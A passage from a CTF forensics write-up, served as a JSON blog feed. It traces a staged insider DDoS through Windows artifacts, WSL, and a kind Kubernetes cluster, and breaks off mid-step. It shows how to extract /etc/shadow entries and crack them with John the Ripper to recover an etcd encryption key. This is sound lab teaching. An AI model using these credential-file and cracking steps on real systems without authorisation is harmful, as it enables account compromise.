{
    "version": "https://jsonfeed.org/version/1",
    "title": "4n6 & k8s",
    "description": "We are a Forensics Duo at SOter14 CTF Team & Network Engineering Students at INSAT. Enjoy our Kubernetes Articles and Write-ups!",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/08/06/Writeups/quals23/",
            "url": "http://example.com/2023/08/06/Writeups/quals23/",
            "title": "Securinets Quals CTF 23 Forensics & Misc Challenges Writeup",
            "date_published": "2023-08-06T18:00:00.000Z",
            "content_html": "<h2 id=\"the-ctf\"><a class=\"markdownIt-Anchor\" href=\"#the-ctf\">#</a> The CTF</h2>\n<p>Securinets Quals CTF was this Securinets generation’s first CTF event on CTFTime where all the big teams have demonstrated therir skills to get to the finals in Tunisia this late-September.</p>\n<p>We present four challenging tasks, two forensics involving Containerization and Kubernetes, Hiberfil.sys, Restore Point, and Crypto-currency Wallet, and two Misc involving Steganography and Reverse Engineering a set-top-box firmware and analyzing its memory dump.</p>\n<p>Congratulations to SKSD, r3kapig, Hexagon for earning the top 3 spots in the CTF, and we deliver a special apperciation to the Securinets masterminds for their hard work and dedication to make this event a huge success, and we hope to see you all in the finals.</p>\n<p>First, our new CTF weight:<br>\n<img data-src=\"https://i.imgur.com/n9elp7B.png\" alt=\"\"></p>\n<p>Scoreboard:</p>\n<p><img data-src=\"https://i.imgur.com/eYBMvzh.jpg\" alt=\"\"></p>\n<h2 id=\"the-betrayers\"><a class=\"markdownIt-Anchor\" href=\"#the-betrayers\">#</a> The Betrayers</h2>\n<p><img data-src=\"https://i.imgur.com/lAWQkqM.png\" alt=\"\"></p>\n<h3 id=\"description\"><a class=\"markdownIt-Anchor\" href=\"#description\">#</a> Description:</h3>\n<p>An IT company provides a critical service to customers. One day, the service is attacked by DDoS. The Attack is originated from within the company’s internal network, and that each compromised host was sending a large number of requests to the server.</p>\n<p>The attack occurred shortly after the company installed a new patch to one of its software programs. Every new version should be hosted by a special web server with DNS record in the private network but this time the new version is hosted by the Technical Director server!!!</p>\n<p>The Technical Director is in trouble and he said that is not the attacker!</p>\n<p>The strange thing is that the program is deleted directly after the blue team figure out the attack!</p>\n<p>We need to get a release from that version and figure out how the attack occur!</p>\n<blockquote>\n<p>The binary expect to do DDoS attack on specifc IP. In this challenge we changed the IP and the rate of send requests</p>\n</blockquote>\n<p>Author: <strong>Raf²</strong></p>\n<p>File: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUU5VbmQ0Q0VYWHJxQUM5Y252bFVFLUFXLWFlV0RzemQvdmlldz91c3A9c2hhcmluZw==\">Download</span></p>\n<h3 id=\"write-up\"><a class=\"markdownIt-Anchor\" href=\"#write-up\">#</a> Write-up</h3>\n<p>Ok Let’s figure out what is happen. We get the disk image of the Technical Director system. The system that host the new program patch. (It must not be this one)</p>\n<p>Let’s start figure out what softwares are installed and check the history of the system.</p>\n<p>Oh as expected there is a mail software. It’s thunderbird. We will check it later.<br>\n<img data-src=\"https://i.imgur.com/y6i9bfK.png\" alt=\"\"></p>\n<p>Let’s Check the browsing history of the system and check what is going on here! We found Edge only here!</p>\n<p>Go to  <code>C:\\Users\\Kong Office\\AppData\\Local\\Edge\\UserData\\Default</code>  and check the  <code>History</code>  database</p>\n<p><img data-src=\"https://i.imgur.com/E1oNXEo.png\" alt=\"\"></p>\n<p>After checking every single link and search. we found searchs about whatsapp desktop how to install it and official whatsapp download website is visited.</p>\n<p><img data-src=\"https://i.imgur.com/geAQL42.png\" alt=\"\"></p>\n<p>Thunderbird is installed for sure. But still no clue for whatsapp for now. Let’s see what we have on the inbox now! It’s time to check the mails! To check the inbox you can go to  <code>C:\\Users\\Kong Office\\AppData\\Roaming\\Thunderbird\\Profiles\\0ppw4tlt.default-release\\ImapMail\\imap.gmail.com</code>  and investigate the  <code>INBOX</code>  file</p>\n<p><img data-src=\"https://i.imgur.com/1J4A8Bx.png\" alt=\"\"></p>\n<p>You can open the file using any text editor to check the mails but it’s the worst way. you’ll find the attachements encoded to base 64 and many trashy details</p>\n<p>You’ll get an ugly view like this if you open it with vscode.<br>\n<img data-src=\"https://i.imgur.com/bH5fHr5.png\" alt=\"\"></p>\n<p>But you can choose any thunderbird inbox viewer available in the internet. I tried a random one and i got a better exeperience to understand what happen.</p>\n<p><img data-src=\"https://i.imgur.com/6T7zVMC.png\" alt=\"\"></p>\n<p>Let’s summerize what we found. One mail telling that the kubernetes cluster is updgraded successfully from the platform engineer, another one from a system adminstration telling the Technical Director about the security updates. Another one from  <code>Securinets INSAT</code>  asking for sponsorship to the National Cyber Security Congress! And the suspicision one is from a dummy mail  <code>4n6nk8s@gmail.com</code> . In this mail we found a clue!<br>\nA stranger tell the Technical Director about deploying a malicious binary and send a mega link! Ahhh Protected one</p>\n<p><img data-src=\"https://i.imgur.com/zalrPXh.png\" alt=\"\"></p>\n<p>The link lead you to a wordlist that have strong and secure passwords. The mail talks about subsystem!! What a subsystem? Is it a  <code>WSL</code>  ??</p>\n<p><img data-src=\"https://i.imgur.com/1Sfnhxu.png\" alt=\"\"></p>\n<p>and here we finished mail browser history and mail investigation. still the whatsapp thing! Where is whatsapp hide his data?? good question. Checking AppData don’t help us. We didn’t find any WhatsApp directory!</p>\n<p>After googling we found that there is some whatsapp version can store his data inside  <code>%AppData%\\Local\\Packages</code> . Let’s check that folder and Bingoo!! We found whatsapp directory! WhatsApp was installed here! Let’s see what we can do here!</p>\n<p><img data-src=\"https://i.imgur.com/4x79Dni.png\" alt=\"\"></p>\n<p>You can find some conversation inside  <code>messages.db</code>  file. It might be encrypted and it might be decrypted. Let’s try to open this database and see what we can find here!</p>\n<p><img data-src=\"https://i.imgur.com/mfM1duI.png\" alt=\"\"></p>\n<p>I am chocked!! Two employees were behind all this!!<br>\nTwo employees hate the director and they want to be in a trouble!</p>\n<p>The attackers talks about encryption and subsystem password and they are shocked because the system is windows! and yes the mega decryption key is shared in this discussion. They send the mail to the director to make it in trouble!!</p>\n<p><img data-src=\"https://i.imgur.com/8ATiHDP.png\" alt=\"\"></p>\n<p>Let’s download that wordlist and check the powershell history commands! I am sure there is something there. Because I found Hyber-V directory in random place while investigating. The history is stored in  <code>%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history. txt</code></p>\n<p><img data-src=\"https://i.imgur.com/GnecotB.png\" alt=\"\"></p>\n<p>Yeah! Everything is cleared now! subsytem, subsystem! They are talking about WSL. WSL is installed here! and it used to host the malicious program! But what they does mean by encryption and the password. Mmmmm I guess we will face some cracking in the few next minutes!</p>\n<p>Let’s check WSL now! Where is windows store the WSL? Just check  <code>%userprofile%\\AppData\\Local\\Packages</code></p>\n<p><img data-src=\"https://i.imgur.com/wIfONXj.png\" alt=\"\"></p>\n<p>Let’s mount this vhdx disk now in our Linux/WSL and check the files in this system. You can use  <code>libguestfs-tools</code>  to achieve this.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>\n<p>Then, you can mount now the wsl disk image:<br>\n<img data-src=\"https://i.imgur.com/0QqjpLl.png\" alt=\"\"></p>\n<p>We found a user named  <code>Kong</code>  and have a home directory. Let’s check his files and bash history!</p>\n<p><img data-src=\"https://i.imgur.com/W7p1CnE.png\" alt=\"\"></p>\n<p>Let’s start with  <code>.bash_history</code>  first. It’s my number one rule!<br>\n<img data-src=\"https://i.imgur.com/7kXO7nj.png\" alt=\"\"></p>\n<p>Wow! The attacker configure wsl.conf then install docker! Mmm He configure it to be boot with systemd!<br>\nThen he installed something called kind, After that he download  <code>kubectl</code> ! Kubectl??? Ah It’s  <code>Kubernetes</code>  time!</p>\n<p>But what is kind? Searching on it. I found that kind is Kubernetes inside Docker. It’s a lightweight kubernetes cluster.</p>\n<p>There is 3 yaml files. For sure there are worth to check! Let’s see what is inside these files!</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">### k-config.yaml content ####</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Cluster</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">kind.x-k8s.io/v1alpha4</span></span><br><span class=\"line\"><span class=\"attr\">networking:</span></span><br><span class=\"line\">  <span class=\"attr\">podSubnet:</span> <span class=\"string\">&quot;10.244.0.0/16&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">serviceSubnet:</span> <span class=\"string\">&quot;10.96.0.0/12&quot;</span></span><br><span class=\"line\">  <span class=\"comment\"># the default CNI will not be installed</span></span><br><span class=\"line\">  <span class=\"attr\">disableDefaultCNI:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">           </span><br><span class=\"line\"><span class=\"attr\">nodes:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">role:</span> <span class=\"string\">control-plane</span></span><br><span class=\"line\">  <span class=\"comment\"># add a mount from /path/to/my/files on the host to /files on the node</span></span><br><span class=\"line\">  <span class=\"attr\">extraMounts:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">hostPath:</span> <span class=\"string\">/etc/crio/crio.conf</span></span><br><span class=\"line\">    <span class=\"attr\">containerPath:</span> <span class=\"string\">/etc/crio/crio.conf</span></span><br><span class=\"line\">    <span class=\"comment\"># optional: if set, the mount is read-only.</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">readOnly:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">selinuxRelabel:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">hostPath:</span> <span class=\"string\">/etc/kubernetes</span></span><br><span class=\"line\">    <span class=\"attr\">containerPath:</span> <span class=\"string\">/etc/kubernetes</span></span><br><span class=\"line\">    <span class=\"comment\"># optional: if set, the mount is read-only.</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">readOnly:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">selinuxRelabel:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">hostPath:</span> <span class=\"string\">/var/lib/netcd</span></span><br><span class=\"line\">    <span class=\"attr\">containerPath:</span> <span class=\"string\">/var/lib/etcd</span></span><br><span class=\"line\">    <span class=\"comment\"># optional: if set, the mount is read-only.</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">readOnly:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"comment\"># default false</span></span><br><span class=\"line\">    <span class=\"attr\">selinuxRelabel:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">role:</span> <span class=\"string\">worker</span></span><br><span class=\"line\">  <span class=\"attr\">kubeadmConfigPatches:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">    kind: JoinConfiguration</span></span><br><span class=\"line\"><span class=\"string\">    nodeRegistration:</span></span><br><span class=\"line\"><span class=\"string\">      kubeletExtraArgs:</span></span><br><span class=\"line\"><span class=\"string\">        node-labels: &quot;app-type=web-app&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span>  <span class=\"attr\">extraPortMappings:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">30999</span></span><br><span class=\"line\">    <span class=\"attr\">hostPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"comment\"># optional: set the bind address on the host</span></span><br><span class=\"line\">    <span class=\"comment\"># 0.0.0.0 is the current default</span></span><br><span class=\"line\">    <span class=\"attr\">listenAddress:</span> <span class=\"string\">&quot;0.0.0.0&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># optional: set the protocol to one of TCP, UDP, SCTP.</span></span><br><span class=\"line\">    <span class=\"comment\"># TCP is the default</span></span><br><span class=\"line\">    <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br></pre></td></tr></table></figure>\n<p>It’s a kind cluster configuration file!! This fiel is used to declare the specification of your cluster! And as you see  <code>/etc/kubernetes</code>  and  <code>/var/lib/etcd</code>  are mounted. We have 2-node cluster and a  <code>extraPortMappings</code>  to expose a service. In addition there is node-labels on the worker-node</p>\n<blockquote>\n<p>This challenge requires some kubernetes knowledge. You must be familiar with the basics of the kubernetes. Like nodes, deployements, pods, services, etc…</p>\n</blockquote>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">### content deploy.yaml ###</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">update-app</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">update-app</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">update-app</span></span><br><span class=\"line\">  <span class=\"attr\">strategy:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">update-app</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">imagePullSecrets:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">regcred</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">medrafk8s/kubersex</span></span><br><span class=\"line\">        <span class=\"attr\">name:</span> <span class=\"string\">update-app</span></span><br><span class=\"line\">        <span class=\"attr\">resources:</span></span><br><span class=\"line\">          <span class=\"attr\">requests:</span></span><br><span class=\"line\">            <span class=\"attr\">memory:</span> <span class=\"string\">&quot;64Mi&quot;</span></span><br><span class=\"line\">            <span class=\"attr\">cpu:</span> <span class=\"string\">&quot;250m&quot;</span></span><br><span class=\"line\">          <span class=\"attr\">limits:</span></span><br><span class=\"line\">            <span class=\"attr\">memory:</span> <span class=\"string\">&quot;128Mi&quot;</span></span><br><span class=\"line\">            <span class=\"attr\">cpu:</span> <span class=\"string\">&quot;500m&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">affinity:</span></span><br><span class=\"line\">        <span class=\"attr\">nodeAffinity:</span></span><br><span class=\"line\">            <span class=\"attr\">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class=\"line\">                <span class=\"attr\">nodeSelectorTerms:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">matchExpressions:</span></span><br><span class=\"line\">                    <span class=\"bullet\">-</span> <span class=\"attr\">key:</span> <span class=\"string\">app-type</span></span><br><span class=\"line\">                      <span class=\"attr\">operator:</span> <span class=\"string\">In</span></span><br><span class=\"line\">                      <span class=\"attr\">values:</span></span><br><span class=\"line\">                      <span class=\"bullet\">-</span> <span class=\"string\">web-app</span></span><br><span class=\"line\">                      <span class=\"bullet\">-</span> <span class=\"string\">front-end</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>This is a deployment manifest that pull a private image  <code>medrafk8s/kubersex</code>  using the imagePullSecrets fields! The nodeAffinity is used for some scheduling specification. In this example the deployment will be deployed in node with labels  <code>app-type=web-app</code></p>\n<p>Let’s summerize now! The attacker installed Kind to deploy the web app that hosts the malicious inside a kubernetes cluster!</p>\n<p>So our objective is to recover the webapp that contains the malicious binary! But how can we restore that container! It’s a private container! What we should to do?</p>\n<p>To get the private container we need to get the pull secret. The credential that allow us to pull the container image! The credential are stored inside a  <code>secret</code>  (Kubernetes Object).</p>\n<p>According to the bash history we have this commands:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">USER=XXXXXXXXXXXXXXXXXXXX</span><br><span class=\"line\">PASSWORD=XXXXXXXXXXXXXXXXXXX</span><br><span class=\"line\">SERVER=XXXXXXXXXXXXXXXXXX</span><br><span class=\"line\">kubectl create secret docker-registry regcred --docker-server=<span class=\"variable\">$SERVER</span> --docker-username=<span class=\"variable\">$USER</span> --docker-password=<span class=\"variable\">$PASSWORD</span></span><br><span class=\"line\">kubectl get secrets</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>The attacker store the credential inside environement and create a pull secret using  <code>kubectl</code>  command</p>\n</blockquote>\n<p>The only way to get the credential is to extract the secret from the  <code>etcd</code> . But We have a problem! The etcd is protected!</p>\n<p>Let’s Back to the bash history you’ll find that the attacker edit a  <code>kube-apiserver.yaml</code>  and  <code>enc.yaml</code> .</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">### enc.yaml ###</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apiserver.config.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">EncryptionConfiguration</span></span><br><span class=\"line\"><span class=\"attr\">resources:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">resources:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">secrets</span></span><br><span class=\"line\">    <span class=\"attr\">providers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">identity:</span> &#123;&#125;</span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">secretbox:</span></span><br><span class=\"line\">          <span class=\"attr\">keys:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">key1</span></span><br><span class=\"line\">              <span class=\"attr\">secret:</span> <span class=\"string\">&lt;BASE64</span> <span class=\"string\">ENCODED&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Let’s talk a little about the  <code>Encryption Configuration</code>  in Kubernetes.</p>\n<p><img data-src=\"./images/https://d33wubrfki0l68.cloudfront.net/2475489eaf20163ec0f54ddc1d92aa8d4c87c96b/e7c81/images/docs/components-of-kubernetes.svg\" alt=\"\"></p>\n<p>As known. Etcd is a distributed key-value store that is used by Kubernetes to store and retrieve the configuration data for the cluster. The Kubernetes API server interacts with etcd to read and write configuration data, such as the current state of the cluster and the desired state. The etcd data store serves as the single source of truth for the Kubernetes cluster’s configuration data, and the API server ensures that this data is always up to date and consistent across the cluster.</p>\n<p>The API server accepts an argument  <code>--encryption-provider-config</code>  that controls how API data is encrypted in etcd. In other words, API server can store the data inside etcd but not in plain text! It’s encrypted to secure the data inside the database! for more details check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvYWRtaW5pc3Rlci1jbHVzdGVyL2VuY3J5cHQtZGF0YS8=\">link</span></p>\n<p>So our mission now is to find the secret value of the  <code>EncryptionConfiguration</code>  to use it after restoring the etcd by setting up a new api server that can read the encrypted data from the  <code>etcd</code> .</p>\n<p><img data-src=\"https://i.imgur.com/XEB64Su.png\" alt=\"\"></p>\n<p>Getting back to the whatsapp discussion. The attacker use the same password for the encryption key and subsystem password!</p>\n<p>Bingo!! Crack time! We know that the encryption key must be 32 bytes. So this information will help us filtering the downloaded wordlist!</p>\n<p>Linux stores user passwords hashes in  <code>/etc/shadow</code> . Great, we have the hash and the wordlist! Let’s do it!</p>\n<p><img data-src=\"https://i.imgur.com/SanopKU.png\" alt=\"\"></p>\n<p>Let’s start filter out the passwords with 32 characters from the wordlist using grep and tail to pick from the bottom:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -E <span class=\"string\">&#x27;^.&#123;32&#125;$&#x27;</span> passwords.txt | <span class=\"built_in\">tail</span> -n 100000 &gt; pass.txt</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to extract the user information from  <code>/etc/shadow</code>  and  <code>/etc/password</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep kong etc/passwd &gt; passwd.txt</span><br><span class=\"line\">grep kong etc/shadow &gt; shadow.txt</span><br></pre></td></tr></table></figure>\n<p>Before start cracking using  <code>John The Ripper</code> . We need to combine the passwd and shadow into a format that john can read.  <code>unshadow</code>  can do this work!</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unshadow passwd.txt shadow.txt &gt; crack-me.txt</span><br></pre></td></tr></table></figure>\n<p>Now our hash is ready for crack. Let’s use john with  <code>--format=crypt</code>  to specify that we are trying to crack yescrypt hash</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john --wordlist=pass.txt crack-me.txt --format=crypt</span><br></pre></td></tr></table></figure>\n<p>After some minutes we got the password!! The password is :  <code>@a*Hd~u32@q1Db/LUiOFxC*W2THm5p*V</code></p>\n<p><img data-src=\"https://i.imgur.com/c1mV0ef.png\" alt=\"\"></p>\n<p>Now it’s time to resotre the  <code>etcd</code> . Restoring a Kubernetes cluster in case of a disaster can be accomplished using etcd snapshots. However, the process of restoring an etcd snapshot is not straightforward and requires expertise. Actually in kubernetes etcd can take snapshot automatically. So we will count on that.</p>\n<p>In this case i will use Kind to generate a lightweight cluster. In case you will use your own cluster you must to know that restoring etcd can lead you to lost your cluster data. So be careful!</p>\n<p>To keep it simple I’ll use the same configuration as  <code>k-config.yaml</code> .</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kind create cluster --config=k-config.yaml</span><br><span class=\"line\">Creating cluster <span class=\"string\">&quot;kind&quot;</span> ...</span><br><span class=\"line\"> ✓ Ensuring node image (kindest/node:v1.25.3) 🖼</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl cluster-info --context kind-kind</span><br><span class=\"line\"></span><br><span class=\"line\">Have a <span class=\"built_in\">nice</span> day! 👋</span><br></pre></td></tr></table></figure>\n<p>In Kind each node will be represented as a container</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ docker ps</span><br><span class=\"line\">CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS         PORTS</span><br><span class=\"line\">  NAMES</span><br><span class=\"line\">eba4afe51855   kindest/node:v1.25.3   <span class=\"string\">&quot;/usr/local/bin/entr…&quot;</span>   2 minutes ago   Up 2 minutes   127.0.0.1:43323-&gt;6443/tcp   kind-control-plane</span><br><span class=\"line\">13d7b697ba1f   kindest/node:v1.25.3   <span class=\"string\">&quot;/usr/local/bin/entr…&quot;</span>   2 minutes ago   Up 2 minutes   0.0.0.0:80-&gt;30999/tcp       kind-worker</span><br></pre></td></tr></table></figure>\n<p>After making sure that the api-server works correctly we need to add the  <code>Encryption Configuration</code>  to make sure that the api server can read the encrypted data after restoring etcd.</p>\n<p>Go and put this file on  <code>/etc/kubernetes/enc/enc.yaml</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apiserver.config.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">EncryptionConfiguration</span></span><br><span class=\"line\"><span class=\"attr\">resources:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">resources:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">secrets</span></span><br><span class=\"line\">    <span class=\"attr\">providers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">identity:</span> &#123;&#125;</span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">secretbox:</span></span><br><span class=\"line\">          <span class=\"attr\">keys:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">key1</span></span><br><span class=\"line\">              <span class=\"attr\">secret:</span> <span class=\"string\">QGEqSGR+dTMyQHExRGIvTFVpT0Z4QypXMlRIbTVwKlY=</span></span><br></pre></td></tr></table></figure>\n<p>Then go to  